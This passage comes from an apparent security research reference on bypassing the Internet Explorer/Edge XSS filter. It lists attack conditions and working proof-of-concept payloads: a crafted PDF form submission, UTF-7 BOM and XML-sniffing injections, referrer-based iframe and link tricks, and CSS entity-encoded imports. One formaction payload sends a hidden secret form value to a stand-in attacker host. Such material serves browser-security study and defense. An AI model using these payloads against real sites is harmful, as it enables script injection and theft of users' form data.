- [https://l0.cm/bypass/ie_0xff_attribute.html](https://l0.cm/bypass/ie_0xff_attribute.html)

### Using the Adobe Acrobat Reader plug-in (IE only)

Conditions for attacking:

1. Has XSS via POST request
2. Target is using the Adobe Acrobat Reader plugin

Reference URL:

- [https://insert-script.blogspot.com/2017/01/complete-internet-explorer-xss-filter.html](https://insert-script.blogspot.com/2017/01/complete-internet-explorer-xss-filter.html)

PoCs:

[https://l0.cm/bypass/ie_postxss_bypass.pdf](https://l0.cm/bypass/ie_postxss_bypass.pdf)

```
%PDF-1.1
1 0 obj
<<
/Type /Catalog
/Outlines 2 0 R
/Pages 3 0 R
/OpenAction 33 0 R
/AcroForm 22 0 R
>>
endobj
2 0 obj
<<
/Type /Outlines
/Count 0
>>
endobj
3 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
4 0 obj
<<
/Type /Page
/Annot [ 23 0 R ]
/Parent 3 0 R
/MediaBox [0 0 612 792]
/Contents 5 0 R
/Resources <<
/ProcSet [/PDF /Text]
/Font << /F1 6 0 R >>
>>
>>
endobj
5 0 obj
<< /Length 56 >>
stream
BT /F1 12 Tf 100 700 Td 15 TL (JavaScript example) Tj ET
endstream
endobj
6 0 obj
<<
/Type /Font
/Subtype /Type1
/Name /F1
/BaseFont /Helvetica
/Encoding /MacRomanEncoding
>>
endobj

33 0 obj
<<
/S /SubmitForm
/F
        <<
        % URL TO SUBMIT TO:
        /F (https://vulnerabledoma.in/bypass/text)
        /FS /URL
        >>
% SPECIFIES THE FORMAT AND OTHER FORM RELATED CONFIGURATION
/Flags 6
>>
endobj

22 0 obj
<<
    /Fields [23 0 R]
>>
endobj
23 0 obj
<<
    /DA (/Helv 12 Tf 0 g)
    /F 4
    /FT /Tx
    /Rect [ 9.526760 680.078003 297.527008 702.078003 ]
    /Subtype /Widget
    /Type /Annot
    % PARAMETER NAME
    /T (q)
    % PARAMETER PAYLOAD
    /V (<script>alert\(1\)</script>)
    /P 4 0 R
>>
endobj
trailer
<<
/Root 1 0 R
>>
```

### Using Content Sniffing for XML (IE only)

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. `X-Content-Type-Options:nosniff`is not attached
3. Character strings can be written from the top of the page

Reference URL:

- [https://twitter.com/0x6D6172696F/status/753647521050849280](https://twitter.com/0x6D6172696F/status/753647521050849280)

PoCs:

[https://vulnerabledoma.in/bypass/text?q=%3C?xml%20version=%221.0%22?%3E%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/ xhtml%22%3Ealert%281%26%23x29%3B%3C/x:script%3E](https://vulnerabledoma.in/bypass/text?q%3D%253C?xml%2520version%3D%25221.0%2522?%253E%253Cx:script%2520xmlns:x%3D%2522http://www.w3.org/1999/xhtml%2522%253Ealert%25281%2526%2523x29%253B%253C/x:script%253E)

```xml
<?xml version="1.0"?><x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1&#x29;</x:script>
```

### Use UTF-7 BOM (IE only)

Conditions for attacking:

1. Character strings can be written from the top of the page
2. `+`Symbols such as , `/`, `-`are allowed

supplement:

`+/v8`, `+/v9`, `+/v+`, are treated as `+/v/`UTF-7 [BOM .](https://ja.wikipedia.org/wiki/%25E3%2583%2590%25E3%2582%25A4%25E3%2583%2588%25E3%2582%25AA%25E3%2583%25BC%25E3%2583%2580%25E3%2583%25BC%25E3%2583%259E%25E3%2583%25BC%25E3%2582%25AF) In IE, if this string appears at the top of the page, the character code of the page is assumed to be UTF-7. Even if the character code is specified in the page, `history.back()`if you open it again via , the character code of that page will be treated as UTF-7. (Although the latter behavior was reported to Microsoft in July 2013, no changes have been made to date.)

PoCs:

(If there is no character code specified on the page) [https://vulnerabledoma.in/bypass/text?q=%2B/v8-%2BADw-script%2BAD4-alert(1)%2BADw-/script%2BAD4-](https://vulnerabledoma.in/bypass/text?q%3D%252B/v8-%252BADw-script%252BAD4-alert(1)%252BADw-/script%252BAD4-)

```html
+/v8-+ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

(If the page has character code specification) [https://l0.cm/bypass/ie_utf7.html](https://l0.cm/bypass/ie_utf7.html)

```html
<script>
function go(){
  window.open("https://vulnerabledoma.in/bypass/text?q=%2B/v8-%2BADw-script%2BAD4-alert(location)%2BADw-/script%2BAD4-&charset=utf-8","a");
  setTimeout(function(){window.open("https://l0.cm/h_back.html","a")},1000);
}
</script>
<button onclick=go()>go</button>
```

### `<?PXML>` use (IE only)

Conditions for attacking:

1. Has reflective XSS
2. `<`3 or more do not appear before the injection point
3. The document mode of the page is set to 9 or less, or you can set the document mode to 9 or less by embedding in a frame, etc.

Reference URL:

- [https://masatokinugawa.l0.cm/2017/05/xss13.html](https://masatokinugawa.l0.cm/2017/05/xss13.html)

PoCs:

[https://vulnerabledoma.in/bypass/text?q=%3C?PXML%3E%3Chtml:script%3Ealert(1)%3C/html:script%3E&xuac=9](https://vulnerabledoma.in/bypass/text?q%3D%253C?PXML%253E%253Chtml:script%253Ealert(1)%253C/html:script%253E%26xuac%3D9)

```html
<?PXML><html:script>alert(1)</html:script>
```

[https://vulnerabledoma.in/bypass/text?q=%3CPXML%3E%3Chtml:script%3Ealert(1)%3C/html:script%3E&xuac=9](https://vulnerabledoma.in/bypass/text?q%3D%253CPXML%253E%253Chtml:script%253Ealert(1)%253C/html:script%253E%26xuac%3D9)

```html
<PXML><html:script>alert(1)</html:script>
```

### Use of referrer

IE/Edge's XSS filter does not work in cases with a Referer header from the same domain (including subdomains) or localhost. Bypassing is possible if such a referrer can be attached.

#### Use of link functions within the same domain (including subdomains)

Conditions for attacking:

1. Has reflective XSS
2. Create links to XSS pages on the same domain (including subdomains)

PoCs:

- [https://vulnerabledoma.in/bypass/same-domain-link.html](https://vulnerabledoma.in/bypass/same-domain-link.html)
- [https://www.vulnerabledoma.in/bypass/same-domain-link.html](https://www.vulnerabledoma.in/bypass/same-domain-link.html)

```html
<a href="https://vulnerabledoma.in/bypass/text?q=<script>alert(1)</script>">Click HERE</a>
```

#### Bypass where arbitrary URL can be specified

Conditions for attacking:

1. There are places where reflective XSS is possible in the link

supplement:

By double linking the vulnerable part and adding a referrer, `javascript:`you can create a link to the URL without reacting the XSS filter.

PoCs:

[https://vulnerabledoma.in/bypass/link?q=?q=javascript%253Aalert(1)](https://vulnerabledoma.in/bypass/link?q%3D?q%3Djavascript%25253Aalert(1))

```html
<a href="?q=javascript%3Aalert(1)">Link</a>
```

#### If the state before submission to the vulnerable form can be maintained on the page

Conditions for attacking:

1. Has reflective XSS
2. The state before submission to the vulnerable form can be maintained on the page of the same domain (including subdomains)

PoCs:

[https://vulnerabledoma.in/bypass/form?q=%26%23x22%3B%3E%26%23x3C%3Bscript%3Ealert%26%23x28%3B1)%26%23x3C%3B/script%3E](https://vulnerabledoma.in/bypass/form?q%3D%2526%2523x22%253B%253E%2526%2523x3C%253Bscript%253Ealert%2526%2523x28%253B1\)%2526%2523x3C%253B/script%253E)

```html
<form action="form">
<input type="hidden" name="q" value="&#x22;>&#x3C;script>alert&#x28;1)&#x3C;/script>">
<input type="hidden" name="secret" value="a09d3ef0">
<input type="submit">
</form>
```

#### Using option tags

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. That XSS is within an existing form

Reference URL:

- [https://html5sec.org/xssfilter/entities](https://html5sec.org/xssfilter/entities)

PoCs:

[https://vulnerabledoma.in/bypass/form3?q=%3Cbutton%20formaction=form3%3ELICK%3Cselect%20name=q%3E%3Coption%3E%26lt%3Bscript%3Ealert(1)%26lt%3B/script% 3E](https://vulnerabledoma.in/bypass/form3?q%3D%253Cbutton%2520formaction%3Dform3%253ECLICK%253Cselect%2520name%3Dq%253E%253Coption%253E%2526lt%253Bscript%253Ealert(1)%2526lt%253B/script%253E)

```html
<form action=submit>
<button formaction=form3>CLICK<select name=q><option>&lt;script>alert(1)&lt;/script>
</form>
```

#### Using an empty iframe

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. The page allows embedding in frames

supplement:

Creating an empty iframe with XSS and navigating a scripted URL to that frame causes a bypass due to the referrer of the vulnerable domain itself.

Reference URL:

- [http://www.cracking.com.ar/bugs/2016-07-14/](http://www.cracking.com.ar/bugs/2016-07-14/)

PoCs:

[https://l0.cm/bypass/ieedge_iframe.html](https://l0.cm/bypass/ieedge_iframe.html)

```html
<!-- Found by @magicmac2000 -->
<iframe onload="contentWindow[0].location='//vulnerabledoma.in/bypass/text?q=<script>alert(location)</script>'" src="//vulnerabledoma.in/bypass/text?q=%3Ciframe%3E"></iframe>
```

### Using formaction (getting information only)

Conditions for attacking:

1. Has reflective XSS
2. You can write a new formaction attribute where you can submit an existing form content that contains sensitive information.

PoCs:

[https://vulnerabledoma.in/bypass/form?q=%22%3E%3Cbutton%20formaction=//attacker/%3E](https://vulnerabledoma.in/bypass/form?q%3D%2522%253E%253Cbutton%2520formaction%3D//attacker/%253E)

```html
<form action="form">
<input type="hidden" name="q" value=""><button formaction=//attacker/>">
<input type="hidden" name="secret" value="a09d3ef0">
<input type="submit">
</form>
```

### Use of character-referenced strings in style (style description only)

Conditions for attacking:

1. Has reflective XSS
2. Attackable with CSS

supplement:

`@`Entity reference notations such as , `:`, `\`, that are part of the reaction string `(`are not taken into account, so bypassing occurs in style blocks and attribute values ​​within SVG where entity reference notations are allowed. `behavior:url()`IE allows script execution via CSS as well as attacks that read information in some cases .

Reference URL:

- [https://twitter.com/0x6D6172696F/status/752190911879184384](https://twitter.com/0x6D6172696F/status/752190911879184384)
- [http://www.businessinfo.co.uk/labs/talk/The_Sexy_Assassin.ppt](http://www.businessinfo.co.uk/labs/talk/The_Sexy_Assassin.ppt)
- [https://blog.innerht.ml/cascading-style-scripting/](https://blog.innerht.ml/cascading-style-scripting/)

PoCs:

[https://vulnerabledoma.in/bypass/text?q=%3Csvg%3E%3Cstyle%3E%26commat%3Bimport'//attacker'%3C/style%3E](https://vulnerabledoma.in/bypass/text?q%3D%253Csvg%253E%253Cstyle%253E%2526commat%253Bimport%27//attacker%27%253C/style%253E)

```html
<svg><style>&commat;import'//attacker'</style>
```

[https://vulnerabledoma.in/bypass/text?q=%3Csvg%3E%3Cstyle%3E@%26bsol%3B0069mport%27//attacker%27%3C/style%3E](https://vulnerabledoma.in/bypass/text?q%3D%253Csvg%253E%253Cstyle%253E@%2526bsol%253B0069mport%2527//attacker%2527%253C/style%253E)

```html
<svg><style>@&bsol;0069mport'//attacker'</style>
```

(IE+IE10 mode only) [https://vulnerabledoma.in/bypass/text?q=%3Cp%20style="behavior%26colon%3Burl('/bypass/usercontent/xss.txt')"%3Etest&xuac=10](https://vulnerabledoma.in/bypass/text?q%3D%253Cp%2520style%3D%2522behavior%2526colon%253Burl(%27/bypass/usercontent/xss.txt%27)%2522%253Etest%26xuac%3D10)

```html
<p style="behavior&colon;url('/bypass/usercontent/xss.txt')">
```

(IE+IE10 mode only) [https://vulnerabledoma.in/bypass/text?q=%3Cp%20style="behavior:url%26lpar%3B'/bypass/usercontent/xss.txt')"%3Etest&xuac=10](https://vulnerabledoma.in/bypass/text?q%3D%253Cp%2520style%3D%2522behavior:url%2526lpar%253B%27/bypass/usercontent/xss.txt%27)%2522%253Etest%26xuac%3D10)

```html
<p style="behavior:url&lpar;'/bypass/usercontent/xss.txt')">
```
